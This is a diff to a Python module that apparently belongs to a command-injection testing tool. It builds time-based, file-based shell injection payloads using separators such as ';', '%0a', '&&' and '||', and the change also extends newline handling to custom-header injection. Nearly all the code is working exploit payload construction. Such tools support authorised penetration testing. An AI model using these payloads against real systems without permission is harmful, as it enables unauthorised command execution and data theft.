@@ -56,7 +56,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
   else:
     if separator == ";" :
       payload = (separator +
-                "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + separator +
+                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
                 "str1=${#str}" + separator +
@@ -69,7 +69,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
     elif separator == "%0a" :
       separator = "\n"
       payload = (separator +
-                "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + separator +
+                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
                 "str1=${#str}" + separator +
@@ -87,7 +87,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
         ampersand = "&"
       payload = (ampersand +
                 "sleep 0 " + separator +
-                "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ") " + separator +
+                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ") " + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ") " + separator +
                 "str1=${#str} " + separator +
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
@@ -99,7 +99,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "echo " + TAG + " > " + OUTPUT_TEXTFILE + " " + pipe + 
+                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + 
                 "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + pipe + "tr -d '\\n'" + pipe + "wc -c) ] " + separator +
                 "sleep " + str(delay) + " "
                 )  
@@ -191,7 +191,9 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
       pass
 
     # New line fixation
-    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
+    if settings.USER_AGENT_INJECTION == True or \
+       settings.REFERER_INJECTION == True or \
+       settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n", ";")
       
   return payload
@@ -245,7 +247,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
   else:
     if separator == ";" :
       payload = (separator +
-                "str=$(" + cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
@@ -262,7 +264,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
     elif separator == "%0a" :
       separator = "\n"
       payload = (separator +
-                "str=$(" + cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
@@ -284,7 +286,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
         ampersand = "&"
       payload = (ampersand +
                 "sleep 0 " + separator +
-                "str=$(" + cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
@@ -398,7 +400,9 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
       pass
 
     # New line fixation
-    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
+    if settings.USER_AGENT_INJECTION == True or \
+       settings.REFERER_INJECTION == True or \
+       settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n", ";")
 
   return payload
@@ -551,7 +555,9 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
     else:
       pass
 
-    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
+    if settings.USER_AGENT_INJECTION == True or \
+       settings.REFERER_INJECTION == True or \
+       settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n", ";")
 
   return payload
@@ -704,7 +710,9 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
       pass
 
     # New line fixation
-    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
+    if settings.USER_AGENT_INJECTION == True or \
+       settings.REFERER_INJECTION == True or \
+       settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
 
   return payload
